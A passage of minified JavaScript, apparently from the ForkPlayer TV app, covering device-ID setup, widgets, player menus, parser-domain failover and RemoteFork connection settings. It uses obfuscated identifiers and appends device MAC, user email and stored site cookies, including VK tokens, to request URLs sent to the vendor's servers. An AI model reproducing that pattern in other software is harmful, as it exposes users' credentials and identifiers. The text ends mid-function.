if($_("device")&&$_("device").net_macAddress){c.ID=$_("device").net_macAddress;c.hardware=$_("device").modelName;c.api="lgapi"}else if(c.platform()=="sony"){var t=navigator.userAgent.match(/Model\/([\S]+)/);c.hardware=t&&t[1]||"sony"}else if(window.lg_uid){c.ID=lg_uid;c.api="lgusb"}
c.statusbar("init id.");if(window.lg_model)c.hardware=lg_model+"_webOS";if(c.hardware&&ua.match(/webappmanager/)&&c.hardware.match(/LF|UF/))c._platform="lgw2";if(document.location.href.indexOf("operatv")>0)c.api="operatv"+c.api;if(c.ID)c.ID.toString().replace(/:|-| /g,"").toLowerCase().substr(0,12);else c.virtual=1;for(var i=10;i<=oInset.lII11v0O000lYpr;i++)c.allfs.push("url"+i);c.statusbar("init id..");if(c.params.get("ts")>0){c.statusbar("_FPZagruzka_ _FPdata from server_...");c.remoteData.get().oncomplete=function(s){c.autoimpok=1;var x=String(s).split("[-..-]");if(x.length<3)c.popUp("<font color=red>_FPError download data, load local settings_!</font>",1500);else{var g=0;for(var i=0;i<x.length&&i<c.allfs.length;i++){c.write(c.allfs[i],x[i]);g+=x[i].length}
c.loadinfo("_FPSize data_ "+g+" _FPBait_!");c.autoimpok=2}
c.appSetInit()}}else c.appSetInit()},getId:function(){var c=this;c.ID=c.ID||c.params.get("ID");if(!c.savedId){if(!c.ID||c.ID.length<12||c.ID.match(/(undefined|file not|file...not|020000000000|112233445566|000000000000)/))
c.ID=c.generateId();if(c.ID){c.ID=c.ID.replace(/:|-| /g,"").toLowerCase().substr(0,12);c.params.set("ID",c.ID);if(c.IDS)c.params.set("IDS",c.IDS);c.savedId=1}}
return(c.ID||"").replace(/:|-| /g,"").toLowerCase().substr(0,12)},inf:function(text,delay,color){var c=this;text=gV(text).replace(/'/g,"").replace(/\r/g,"").split('\n');clearTimeout(c.inftimer);if($_("textinfo")){if(text){var t=$_("textinfo").innerHTML;if(t)t+="<br>";text=t+"<span style='color:"+(color||"white")+";background-color:black;'>"+text+"</span>";$_("textinfo").style.zIndex="2";c.inftimer=setTimeout(function(){$_("textinfo","");$_("textinfo").style.zIndex="0"},(delay||800))}
$_("textinfo",text)}},addident:function(u,m){var c=this;u=String(u||"");if(c.params.get('browser')=="ott"&&u.indexOf("http://cloudflare.appfxml.com/")!=0){var ident="box_mac="+c.getId()+"&box_client=OTTPlayer2.006&rts"+(T.inetTime+(new Date().getMilliseconds()))}else{ident="box_client=lg&box_mac="+(c.getId()||"&box_dev="+c.BID)+"&initial="+c.box_client+"|"+c.getId()+"|"+encodeURIComponent(gV(c,"hardware"))+"|"+gV(c,"IDS")+"|"+c.getXY()+"|"+encodeURIComponent(c.params.get("name"))+"&platform="+c.platform()+"&country="+c.ipCountry+"&tvp="+c.timestamp+"&hw="+c.countHw;if(c.app_cors||(c.params.get("remote")>=2&&c.params.get("remoteactive"))){var type="";if(c.app_cors){if(c.series=="D"||c.series=="C")type="sams_d";else type=c.platform()}else if(c.params.get("remoteip").indexOf(":8027")>0)type="curl_windows";else if(c.params.get("remoteip").indexOf(":8028")>0)type="curl_androind";ident+="&cors="+type}
if(c.macv)ident+="&mv="+c.macv;if(c.oID)ident+="&oID="+c.oID}
if(c.user)ident+="&box_user="+encodeURIComponent(gV(c.user,"email"));if(!u)return"&"+ident.replace(/ /g,"%20");var post=gV(u.match(/(#POST.*$)/),1);u=u.split("#")[0];c.lO01OO1Ol1HUx00IIllYpr=c.lO01OO1Ol1HUx00IIllYpr||lIlI1VBOOlI01QYpr(c.read("storage"))||{};if(u.match(/^https?:\/\//)){var dm=u.match(rCook);if(dm!=null){dm=dm[3]}else dm="localhost";if(dm=="cloudflare.appfxml.com"&&!c.lO01OO1Ol1HUx00IIllYpr[dm]&&c.lO01OO1Ol1HUx00IIllYpr["cloudflare.appinfo.su"])c.lO01OO1Ol1HUx00IIllYpr[dm]=c.lO01OO1Ol1HUx00IIllYpr["cloudflare.appinfo.su"];if(c.params.get("vk_id")!=""&&dm=="vk.com"&&!c.lO01OO1Ol1HUx00IIllYpr[dm]){c.lO01OO1Ol1HUx00IIllYpr[dm]={};c.lO01OO1Ol1HUx00IIllYpr[dm].vk_id=c.params.get("vk_id");c.lO01OO1Ol1HUx00IIllYpr[dm].vk_token=c.params.get("vk_token")}
if(c.lO01OO1Ol1HUx00IIllYpr[dm]){for(var i in c.lO01OO1Ol1HUx00IIllYpr[dm])ident+="&cookie["+i+"]="+encodeURIComponent(c.lO01OO1Ol1HUx00IIllYpr[dm][i]);}}
if(u.indexOf("initial=")>0&&u.indexOf("box_mac")>0)return u+post;if(u.indexOf("?")>0)u+="&";else u+="?";ident=ident.replace(/ /g,"%20");u+=ident;if(m)u=u.replace(/\|/g,"-.-");return u+post},updateLogin:function(m){var c=this;if(!m)setTimeout(function(){if(c.countHw==-1)c.updateLogin()},50000);var hm=c.hm.replace(c.getId()+";","");var url=c.addident("http://cloudflare.appfxml.com/browseraccount/?do=ping&type=json&mtype="+c.api+"-"+c.virtual+"&uadns="+c.uadns+"&loader_box_client="+(window.box_client||"")+"&loader_platform="+c.loader_platform+"&hm="+hm+"&errs="+counterr);if(window.is_ver)url+="&_isver="+window.is_ver;if(c.platform()=="android-device")url+="&signature="+c.signature+"&build="+c.build;if(m)url+="&_upd=1";uHelper.create().addh({"Referer":"http://forkbeta.tv/device_"+c.hardware+"_"+c.platform()+"_"+c.getId()}).get(url).parse=function(s){if(s){c.updateLoginData(s);c.write("lastdata",s)}else c.countHw=-1}},mt:"",lastpaydlog:0,updateLoginData:function(s){var c=this;var d=lIlI1VBOOlI01QYpr(s)||{};if(d.err)c.inf("Error startup data: "+d.err,3000,"orange");c.mt=d.mt;c.gid=d.gid||"";FXMLPage.setCookie("http://cloudflare.appfxml.com/",{"gid":c.gid});c.ipG=d.ip||c.ipG;c.ipCountry=d.country||"";c.ipC=d.city;c.dateto=d.ex;c.tgid=d.tgid;c.tgs=d.is_subscribed;c.lastpaydlog=d.payd;c.timestamp=d.timestamp||0;if(gVs(d,"referer").indexOf("/device")>0)c.xhr_referer=3;else if(d.referer)c.xhr_referer=1;else c.xhr_referer=0;if(d.email){c.user={"login":d.name,"email":d.email,"md5":d.md5,vf:d.vf}}else c.user=null;if(d.info)confirmed.create(d.info,"Profile","OK");var but_b="#ff0000",but_t="i";if(c.user){but_b="#ff5722";if(c.timestamp>2)but_t=c.user.email.substr(0,1)}
if(c.timestamp>2)but_b="#009688";var but='<div id="butacc" style="position: absolute;width: 16px; height: 16px;margin: 13px 0px 0px 12px;background-color: '+but_b+'; font-size: 13px;overflow: hidden;text-align: center; border-radius: 8px;">'+but_t+'</div>';$_('bt6',but);uHelper.updateDef()},isflexc:-1,isFlex:function(){if(this.isflexc===-1){var el=document.createElement('div');el.style.display='flex';this.isflexc=(el.style.display==='flex')?1:0}
return this.isflexc===1},getXY:function(){var c=this;if(c.mt&&c.ipG&&librarys.exis("md5"))return c.mt+"|"+md5("fork"+c.ID+c.ID+c.IDS+c.virtual+c.api+ipG+"player").substr(2,15).toUpperCase()+"|"+c.api+"|"+c.virtual;else return""},each:function($obj,callback){for(var i in $obj)
if(callback($obj[i],i)===!1)break},hintremove:function(){if($_("hint")){$_("hint").style.backgroundColor="#656363";setTimeout(function(){var hint=$_("hint");if(hint&&hint.parentNode)hint.parentNode.removeChild(hint)},2000)}
maJor.widgets.hideinfo()},hint:function(s,m,bgcolor,w,border){oInset.panel.set_show();if(m=="kb6"){var l=872}else l=820;if(w)l=1238-w
l=(l*maJor.screen().w/1280);if($_("popUp").style.display=="block")$_("popUp").style.display="none";var obj=$_("hint");if(obj&&obj.parentNode)obj.parentNode.removeChild(obj);var div=document.createElement('div');div.id="hint";div.style.position="absolute";div.style.textAlign="center";div.style.padding="4px";div.style.fontSize="16px";div.style.fontFamily="Arial, sans-serif";div.style.backgroundColor=bgcolor||"#4b4b4b";div.style.color="white";div.style.zIndex="2";div.style.width=(w||380)+"px";div.style.borderRadius="10px";div.style.borderTopRightRadius="0px";div.style.top=(oInset.panel.is_hide()?0:62)+"px";if(border)div.style.border=border;else div.style.border="1px solid transparent";div.style.left=l+"px";$_("main").appendChild(div);$_("hint",s)},updateWeather:function(){var c=this;clearTimeout(c.uWt);c.uWt=setTimeout("maJor.updateWeather();",1800000);if(c.params.get("weather")==-1){$_("weather").style.display="none";return}
uHelper.create("directnoheader").hid().getI("http://cloudflare.appfxml.com/browseraccount/?do=weather&version=2&box_low="+c.box_low+"&id="+maJor.params.get("weather")).parse=function(s){var x=lIlI1VBOOlI01QYpr(s);if(x){c.widgets.all.weather.data=x;$_("weather").style.display="inline-block";$_("weather",c.widgets.html("weather")+'<span style="border-right: 1px solid gray;margin: 0px 3px;font-size: 16px;">&nbsp;</span>');c.widgets.city=x.city}};maJor.parsers.domain()},sPlayer:{"tizen":"Tizen _FPpleer_","download":"_FPVstroenniy_ _FPpleer_","manual":"System media player...","vimu":"Vimu player","ifrhtml5":"Iframe HTML5 _FPpleer_","html5":"HTML5 _FPpleer_","media":"_FPMedia_ _FPpleer_","ext":"_FPVneshniy_ _FPpleer_","exthtml5":"_FPVneshniy_ HTML5 _FPpleer_","extmedia":"_FPVneshniy_ _FPMedia_ _FPpleer_","jw":"JW Player 8.20.1"},sIconPlayer:{"tizen":"tizen_m.png?ndate230830_","download":"vstrpleer.png","manual":"media.png","vimu":"media.png","ifrhtml5":"html5_ifr.png?ndate240209_","html5":"html5_m.png?ndate240209_","media":"media_m.png?ndate240209_","ext":"","exthtml5":"","extmedia":"","jw":"jw.png?ndate240209_"},getPlayer:function(){var c=this;if(c.platform()=="android-device"&&c.build>=5.2){c.sPlayer.media="MX Player";var exPl=["html5","jw","manual","media","vimu","ifrhtml5"];var exPlV=["jw","html5","manual","media","vimu","ifrhtml5"];var exAll=exPl}else{exAll=["html5","jw","media","ifrhtml5","download"];if(c.platform()=="tizen"){exPl=["html5","jw","tizen"];exPlV=["jw","html5","tizen"];exAll=["html5","jw","tizen","ifrhtml5","download"]}else if((c.platform().match(/maple/)&&c.box_low)||c.platform().match(/dune|mag/)){exPl=["media"];exPlV=["media"]}else if(c.platform().match(/webtizen|iphone|sony|webos|uc/)){exPl=["html5","jw","ifrhtml5"];exPlV=["jw","html5","ifrhtml5"]}else if(c.box_low){exPl=["media","html5","ifrhtml5"];exPlV=["media","html5","ifrhtml5"]}else{exPl=["html5","jw","media","ifrhtml5"];exPlV=["jw","html5","media","ifrhtml5"]}}
if(!window.jwplayer){exPl=arrDelValue(exPl,"jw");exPlV=arrDelValue(exPlV,"jw")}
var x={all:{},v:{},s:{},player:{title:c.sPlayer[maJor.params.get('player')],name:maJor.params.get('player'),icon:c.sIconPlayer[maJor.params.get('player')]},streamplayer:{title:c.sPlayer[maJor.params.get('streamplayer')],name:maJor.params.get('streamplayer'),icon:c.sIconPlayer[maJor.params.get('streamplayer')]}};for(var i in exPl)x.v[exPl[i]]={title:(c.sPlayer[exPl[i]]||i),icon:(c.sIconPlayer[exPl[i]]||i),name:exPl[i]};for(var i in exPlV)x.s[exPlV[i]]={title:(c.sPlayer[exPlV[i]]||i),icon:(c.sIconPlayer[exPlV[i]]||i),name:exPlV[i]};for(var i in exAll)x.all[exAll[i]]={title:(c.sPlayer[exAll[i]]||i),icon:(c.sIconPlayer[exAll[i]]||i),name:exAll[i]};return x},synced:function(){if(maJor.params.get("ts")!=-1&&(handler!="player"||vPlayer.paused))autoexport("user");if(maJor.params.get("ts")>0)autoexport("timer")},appSetInit:function(){var c=this;c.statusbar("load app");c.hm=c.params.get("hm")||"";if(c.getId()&&c.hm.indexOf(c.getId())==-1){c.hm+=c.getId()+";"}
c.params.set("hm",c.hm);if(confirmed)confirmed.close();maJor.setHandler("menu");try{c.lO01OO1Ol1HUx00IIllYpr=c.lO01OO1Ol1HUx00IIllYpr||lIlI1VBOOlI01QYpr(c.read("storage"))||{};c.updateLoginData(c.read("lastdata"));c.updateLogin();c.statusbar("load user data")}catch(e){jsshowErr("INIT USR DATA "+e.message)}
if($_("video"))$_("video").style.zIndex="0";if(c.platform()=="android-device"&&c.build<5.1)c.inf("Доступна новая версия приложения!",1800);setInterval(function(){maJor.nupd++;if(maJor.timestamp<3&&maJor.nupd%2==1)return;maJor.synced()},180000);if($_("startlogo"))$_("startlogo").style.display="none";c.llII0lOCvOQO0OYpr="about:blank";c.statusbar("_FPOzhidanie_ _FPmenu_..");c.lO01II111Irn0OI1IlYpr=c.params.get("history")||[];try{oInset.init()}catch(e){jsshowErr("LOAD INSETS "+e.message)}
try{c.updateWeather();vPlayer.audio.showPlayer("autostart")}catch(e){jsshowErr("LOAD wa "+e.message)}
if(!c.app_cors)uHelper.create("directnoheader").hid().get("http://staticdata.appfxml.com/staticfiles/cors.html").parse=function(s){if(s){c.app_cors=1;c.app_cors_referer=0}};booting=0;$_("main").focus();var img=document.createElement('img');img.src="http://counter.yadro.ru/hit?t14.10;rhttp%3A//forkplayer.tv/wiki/%25D0%2591%25D1%2580%25D0%25B0%25D1%2583%25D0%25B7%25D0%25B5%25D1%2580_Fork_-_Wiki%3AForkplayer.tv;s2560*1080*24;uhttp%3A//forkplayer.tv/wiki/Donations;hDonations%20%u2014%20%u0411%u0440%u0430%u0443%u0437%u0435%u0440%20Fork%20-%20Wiki;"+Math.random()},parsers:{all:{"http://fxmlparsers.in.net/":{last:0,res:0,pending:!1},"http://p3.fxmlparsers.in.net/":{last:0,res:0,pending:!1},"http://fxmlparsers.in.net.exec3.remotecurl.appfxml.com/":{last:0,res:0,pending:!1}},kall:function(){var k=[];for(var i in this.all)k.push(i);return k},interval:900,fxml_domain:null,exis:function(u){var exv=!1;u=String(u||"");for(var url in this.all){if(u.indexOf(url)===0||(u+"/").indexOf(url)===0){exv=url;break}}
return exv},car:function(u){var c=this;var d=c.exis(u);if(d&&!c.ping(d))return c.link(u);return u},ping:function(u){var c=this;var now=T.timestamp;var item=c.all[u];if(!item)return 0;if(item.pending)return 1;if((item.res||item.last)>now-c.interval){return item.res}
item.pending=!0;item.res=1;item.last=now;uHelper.create("directnoheader").hid().setMaxTime(4).get(u+"?uri=ping").parse=function(s){item.pending=!1;if(s&&s==="pong"){item.res=now}else{item.res=0}};return item.last},checkdomains:function(n){var c=this;var keys=c.kall();n=n||0;var u=keys[n];var item=c.all[u];if(!item)return;if(!item.res||item.res<T.timestamp-c.interval){item.pending=!0;item.last=T.timestamp;uHelper.create("directnoheader").hid().setMaxTime(4).get(u+"?uri=ping").parse=function(s){item.pending=!1;if(s&&s==="pong"){item.res=T.timestamp;c.fxml_domain=u}else{item.res=0;if(n<keys.length-1){c.checkdomains(n+1)}}}}},domain:function(){var c=this;if(!c.fxml_domain||(c.all[c.fxml_domain]&&c.all[c.fxml_domain].res<T.timestamp-c.interval)){c.checkdomains()}
return c.fxml_domain||c.kall()[0]},link:function(u){var c=this;if(u){if(c.fxml_domain){return String(u).replace(/^http:\/\/(?:[a-zA-Z0-9-]+\.)*fxmlparsers\.in\.net(?:\.[a-zA-Z0-9-]+)*\//i,c.fxml_domain)}
return u}
return c.fxml_domain||c.kall()[0]}},loadinfo:function(s){maJor.statusbar(s)},timeAgo:function(time){if(!time)return"";var diff=Math.floor(T.timestamp-time);var s="";if(diff<60)s=diff+" _FPsec_";else if(diff<3600)s=Math.floor(diff/60)+" _FPmin_";else if(diff<86400)s=Math.floor(diff/3600)+" _FPhours_";else if(diff<604800)s=Math.floor(diff/86400)+" _FPdays_";else if(diff<2419200)s=Math.floor(diff/604800)+" _FPweeks_";else if(diff<29030400)s=Math.floor(diff/2419200)+" _FPmonths_";else s=Math.floor(diff/29030400)+" _FPyears_";return s+" _FPago_"},widgets:{panel:{},hideinfo:function(){if($_("popUp").style.textAlign=="center"){$_("popUp").style.display="none";this.is_showinfo=0}},showinfo:function(text,id){var c=maJor,left=0,top=0;c.popUp(text);$_("popUp").style.fontSize="20px";$_("popUp").style.textAlign="center";$_("popUp").style.width="auto";if(String(id).indexOf("inset")===0){left=$_(id).offsetLeft+5;if(id=="inset0")left+=120;top=$_(id).offsetTop+34;if($_(id).offsetParent&&$_(id).offsetParent.offsetLeft)left+=$_(id).offsetParent.offsetLeft}else{text="<img height='18' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+text;if($_(id)){var pwidth=$_(id).offsetWidth;var porigw=$_("popUp").offsetWidth;if(pwidth<porigw)pwidth=porigw;left=$_(id).offsetLeft-pwidth+12}
top=$_(id).offsetTop+26}
this.is_showinfo=1;if(left){$_("popUp").style.left=left+"px";$_("popUp").style.top=top+"px"}},open:function(v){var c=maJor,m;v=String(v);var mvo=v;if(v.match(/torrserve|acestream/)){if(v.indexOf("torrserve")===0){var port=8090;mvo=v.replace(/\d+$/,"")}else if(v=="acestream")port=6878;else port=8027;m=[];m.push({"before":"<div class='menubefore'>"+getip(v,0,1)+"</div>","title":"_FPRenew_ "+v,"playlist_url":"cmd:widgets:update:"+v});if(v.indexOf("torrserve")===0)m.push({"title":"Открыть активные торренты","playlist_url":"http://"+getip(v)+"/playlistall/all.m3u"});if(v.indexOf("acestream")===0){m.push({"title":"Поиск в AceStream","search_on":"Введите поисковую фразу","local":"direct","playlist_url":"http://"+getip(v)+"/search?query={search}"});m.push({"title":"AceStream P2P трансляции","local":"direct","playlist_url":"http://parsers.appfxml.com/torrentsites/"})}
var submenu=[];submenu.push({"title":"_FPDisable_","playlist_url":"cmd:widgets:set:"+v+":-1","icon":(!maJor.params.get(v)?"_ST_checktrue.png":"")});submenu.push({"title":"_FPDetect from_ RemoteFork","playlist_url":"cmd:widgets:set:"+v+":"});submenu.push({"title":"_FPThis device_ 127.0.0.1:"+port,"playlist_url":"cmd:widgets:set:"+v+":127.0.0.1:"+port});submenu.push({"title":"_FPEnter manually_","value":(maJor.params.get(v)||""),"regex":"^(?:\\s*|((\\w+):(\\w+)@)?(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})(:\\d{1,5}))$","error":"Error! Enter IP:PORT example 127.0.0.1:"+port+" or  USER:PASS@IP:PORT","search_on":"Enter IP:PORT или USER:PASS@IP:PORT (Default port :"+port+")","type":v,"playlist_url":"cmd:widgets:set:"+v});c.each(c.enteresObj,function(o){if(gV(o,"t")==mvo&&o.n){var name=String(o.n).replace(/.*?.*?@/,"***@");submenu.push({"title":name+" "+(o.s&&(c.timeAgo(o.s))),"playlist_url":"cmd:widgets:set:"+v+":"+o.n})}});m.push({"title":"_FPChange IP address_","playlist_url":"menu","menu":submenu})}else if(v=="weather"){m=[];var city=this.city||"_FPSelect city_";m.push({"before":"<div class='menubefore'>"+city+"</div>","title":"_FPRenew_","playlist_url":"cmd:widgets:update:weather"});m.push({"title":"_FPDisable_","playlist_url":"cmdsetWeatherId-1"});m.push({"title":"_FPDetect automatically_","playlist_url":"cmdsetWeatherId0","icon":(c.params.get("weather")==0?"_ST_checktrue.png":"")});m.push({"title":"_FPSelect city_","playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=weather&id=set"})}else if(v=="widgets_time"){m=[];for(var i=-11;i<=11;i++){var t=new Date(T.inetTime+i*3600000);var dstring=to(t.getHours(),t.getMinutes());dstring+=" UTC ";if(i>0)dstring+="+";dstring+=i;if(maJor.params.get("JTVRegion")==i)dstring="<b>"+dstring+"</b>";m.push({"title":dstring,"playlist_url":"about:settings#set:JTVRegion:"+i})}}else if(v=="remote"){m=[];m.push({"before":"<div class='menubefore'>"+getip("remoteip")+"</div>","title":"_FPRenew_ RemoteFork","playlist_url":"cmd:widgets:update:remote"});var submenu=[];submenu.push({"title":"_FPDisable_","playlist_url":"cmd:widgets:set:remote:0","icon":(!maJor.params.get('remote')?"_ST_checktrue.png":"")});submenu.push({"title":"_FPDetect automatically_","playlist_url":"cmd:widgets:set:remote:2","icon":(maJor.params.get('remote')==2?"_ST_checktrue.png":"")});submenu.push({"title":"_FPEnter manually_","search_on":"_FPEnter_ IP:PORT","search_title":"Порт RemoteFork PC версии :8027, Андроид :8028","value":maJor.params.get("remoteip"),"filter":"answer","error":"Error! Enter IP:PORT example 127.0.0.1:8027","type":"remote","playlist_url":"cmd:widgets:set:remoteip","icon":(maJor.params.get('remote')==3?"_ST_checktrue.png":"")});c.each(c.enteresObj,function(o){if(gV(o,"t")==v&&o.n)submenu.push({"title":o.n+" "+(o.s&&(c.timeAgo(o.s))),"playlist_url":"cmd:widgets:set:remoteip:"+o.n})});m.push({"title":"_FPChange IP address_","playlist_url":"menu","menu":submenu})}
if(m)ContextMenu.show("onlymenu",m)},cmd:function(v,pq){var c=maJor;if(v=="update:weather"){c.inf("Обновление погоды",1500);c.updateWeather()}else if(v=="update:torrserve"){c.inf("Обновление состояния Torrserve",1500);maJor.Remote.plugping("torrserve")}else if(v=="update:torrserve2"){c.inf("Обновление состояния Torrserve reserve",1500);maJor.Remote.plugping("torrserve2")}else if(v=="update:acestream"){c.inf("Обновление состояния Acestream",1500);maJor.Remote.plugping("acestream")}else if(v=="update:remote"){c.inf("Обновление состояния RemoteFork",1500);maJor.Remote.init()}else if(v.indexOf("set:")==0){var t=v.split(":");if(t[2]&&t[3]&&t[4])t[2]=t[2]+":"+t[3]+":"+t[4];else if(t[2]&&t[3])t[2]=t[2]+":"+t[3];t[2]=t[2]||(pq&&pq.inputed&&pq.inputed.text)||"";if(t[1]=="remoteip"){c.params.set("remote",3);c.params.set("remoteip",t[2]);this.cmd("update:remote")}else{c.params.set(t[1],t[2]);this.cmd("update:"+t[1])}}},all:{"remote":{"img":"_ST_pcremote.png?ndate240617_","svg":'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M3 4h18c1.1 0 2 .9 2 2v10c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2zm0 12h18V6H3v10z" fill="currentColor"/><path d="M8 18h8v2H8z" fill="currentColor"/></svg>',"title":""},"torrserve":{"img":"_ST_pctorrserve.png?ndate240617_","svg":'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 24">  <path d="M0 0h24v24H0z" fill="none"/>  <path d="M13 10V3L4 14h7v7l9-11h-7z" fill="currentColor"/></svg>',"title":""},"torrserve2":{"img":"_ST_pctorrserve.png?ndate240617_","svg":'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 24">  <path d="M0 0h24v24H0z" fill="none"/>  <path d="M13 10V3L4 14h7v7l9-11h-7z" fill="currentColor"/></svg>',"title":""},"acestream":{"img":"_ST_pcacestream2.png?ndate240617_","svg":'<svg viewBox="-3 -3 31 31" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M22.2 1.175c-1.924-.824-3.989-1.005-6.061-.587-1.59.348-3.409 1.11-5.143 2.408-.343-.22-.687-.44-1.034-.657-.298.648-.594 1.332-.89 2.043-.727 1.637-1.467 3.312-2.222 5.021 1.637-.533 3.288-1.065 4.944-1.587l2.412-.721-1.293-.843c1.193-.967 2.57-1.706 4.009-2.246 1.57-.595 3.25-.619 4.85-.187H22.2zM25.307 11.921c1.498-3.222 1.335-5.764-.098-7.464-1.366-1.56-3.6-2.179-6.01-2.297.251-.566.502-1.146.75-1.738l-2.97 1.483-2.87 1.819c.497.435.999.884 1.507 1.347l2.01 2.021c.305-.73.607-1.462.906-2.197 1.448.299 2.864.832 4.118 1.743 1.014.702 1.95 1.731 1.62 4.088zM12.518 23.601c3.927-.734 6.942-2.929 8.501-5.765.626-1.157 1.176-2.379 1.426-3.662.25-1.283.245-2.492.04-3.685 1.1-.33 2.19-.665 3.273-1.003-1.02-.595-2.048-1.182-3.086-1.764-1.174-.64-2.358-1.285-3.552-1.935-.484.988-.973 1.986-1.465 2.994-.55 1.11-1.108 2.233-1.676 3.37 1.117-.374 2.24-.755 3.366-1.128.114 1.584-.355 3.184-1.59 5.063-1.676 2.647-4.691 4.317-8.501 5.38zM.9 18.927c1.01 2.138 2.638 3.244 4.882 3.293 2.016.045 4.244-.95 6.171-2.406.489.508.983 1.03 1.482 1.565.391-1.14.781-2.294 1.168-3.462.731-2.097 1.463-4.198 2.196-6.3-1.178.252-2.364.508-3.556.764l-3.226.702c.442.53.886 1.068 1.332 1.614-1.482 1.378-3.1 2.502-4.824 2.652-1.484.147-2.94-.323-4.183-1.482zM2.003 8.347C.441 11.717.103 13.969.149 15.438c.071 1.566.775 2.619 1.996 3.011-.362.685-.724 1.378-1.087 2.077 1.011-.435 2.028-.87 3.048-1.303 1.066-.455 2.136-.904 3.212-1.354-.395-.63-.792-1.267-1.191-1.912-.589-1.09-1.18-2.178-1.772-3.264-.362.69-.724 1.38-1.086 2.072-.929-.398-1.77-1.02-2.127-2.17-.473-1.568-.27-3.108 1.083-5.495zM11.687.782C9.174 1.51 7.493 2.491 6.371 3.567c-1.015.96-1.735 2.226-2.149 3.843L2.626 7.662c.366.385.735.774 1.109 1.165 1.072 1.09 2.154 2.188 3.246 3.292 1.187-1.465 2.374-2.939 3.562-4.423-1.001.326-2.006.648-3.014.961.269-.994.714-2.002 1.485-2.887 1.004-1.144 2.099-2.202 4.053-3.312z" fill="currentColor"></path></svg>',"title":""},"weather":{},"widgets_time":{"title":""}},html:function(m){var c=maJor;var html="";c.each(this.all,function(v,k){if(m){if(m==k&&m=="weather"&&v.data&&v.data.city){html=gVs(v.data,"icon")+" <span style='max-width: 110px;overflow: hidden;text-overflow:ellipsis;float: left;text-wrap: nowrap;padding-right:2px;'>"+v.data.city+"</span> "+v.data.temp+"°C"}}else{var h='<span class="appwidgets" id="'+k+'"';if(v.title)h+=' title="'+v.title+'"';if(v.onclick)h+=' onclick="'+v.onclick+'"';h+='>';h+='</span>';html=html+h}});return html},info:function(m){var c=maJor;if(String(m).match(/torrserve|acestream|remote/)){if(c.params.get(m+"active"))return"Подключено";else if(this.all[m].connected==2&&this.all[m].loading+30<T.timestamp)return"Подключение..";else return"Нет подключения"}else return""},connected:function(m,n,hid){var c=maJor;this.all[m].connected=n;if(n==2)this.all[m].loading=T.timestamp;else this.all[m].loading=0;if(String(m).match(/torrserve|acestream|remote/)){var ms=String(m).replace(/\d+/,"");if(n==1||n==0)c.params.set(m+"active",n);if(n==1)VK.saveQuickEnteres(getip(m),ms)}
if(n==1&&this.all[m].disabled)this.disabled(m,0);this.update(m);if(!hid&&getSelect()==-1&&oInset.allI()[insetSelect]==m)Il01QllQll().hint()},disabled:function(m,n){this.all[m].disabled=n;if(n&&m)this.connected(m,0);this.update(m)},update:function(m){var c=maJor;c.each(this.all,function(v,i){if(m&&i!=m)return;var html="";if(v.loading&&v.loading+30<T.timestamp)html+="<img align='left' height='12'  src='"+_img("_ST_upload_m.gif?ndate240617_")+"' style='position:absolute;'>";else if(!c.params.get(m+"active")){if(c.supports.svg)html+='<svg class="widgetdc" viewBox="-3.97 -3.97 20.74 20.74" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#ff8888"><g stroke-width="0"></g><g stroke-linecap="round" stroke-linejoin="round"></g><g><path d="M6.4 1.6C3.76 1.6 1.6 3.76 1.6 6.4s2.16 4.8 4.8 4.8 4.8-2.16 4.8-4.8S9.04 1.6 6.4 1.6z m0 1.07c0.83 0 1.6 0.29 2.24 0.75L3.41 8.64C2.95 8 2.67 7.23 2.67 6.4c0-2.05 1.68-3.73 3.73-3.73z m0 7.47c-0.83 0-1.6-0.29-2.24-0.75l5.23-5.23c0.45 0.64 0.75 1.41 0.75 2.24 0 2.05-1.68 3.73-3.73 3.73z"></path></g></svg>';else html+="<img class='widgetdc' src='"+_img("_ST_disconnect.png?ndate240617_")+"' style='position:absolute;'>"}
if(v.svg&&c.supports.svg)html+=v.svg;else if(v.img)html+="<img align='left' height='18'  src='"+_img(v.img)+"'>";if(v.disabled)$_(i).style.display="none";else $_(i).style.display="inline-block";$_(i,html)})}},regIpPort:new RegExp(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}$/),Remote:{init:function(){var c=maJor,cc=this;this.remote=c.params.get('remote');this.remoteip=c.params.get('remoteip');if(c.regIpPort.exec(String(this.remoteip))==null)this.remoteip="";c.widgets.disabled("remote",!this.remote);if(this.remote){if(this.remote==2){if(this.remoteip)this.ping(!0);else this.getip()}else if(this.remote==3){if(this.remoteip)this.ping();else{c.widgets.connected("remote",0,1);c.widgets.showinfo("Неверный IP:PORT для RemoteFork "+c.params.get('remoteip')+"! Установите эти данные, или выставьте значение _FPauto_","remote")}}}
setTimeout(function(){cc.plugping()},150)},getip:function(){var c=maJor;var url="http://remote.forkbrowser.top/remote/index.php";uHelper.create("directnoheader").hid().get(url+"?do=active&ver=2&initial="+c.getId()+"|"+c.platform()+"|"+c.params.get("name")).parse=function(s){if(s){var gp=s.split("|")[0];if(s.split("|")[0].indexOf(":80")>0&&gp.length>9){if(c.params.get('remoteip')!=gp){c.params.set("remoteip",gp);if(gP("lO10111O0001lOl00Ypr")=="about:settings"){Il01QllQll().reload()}
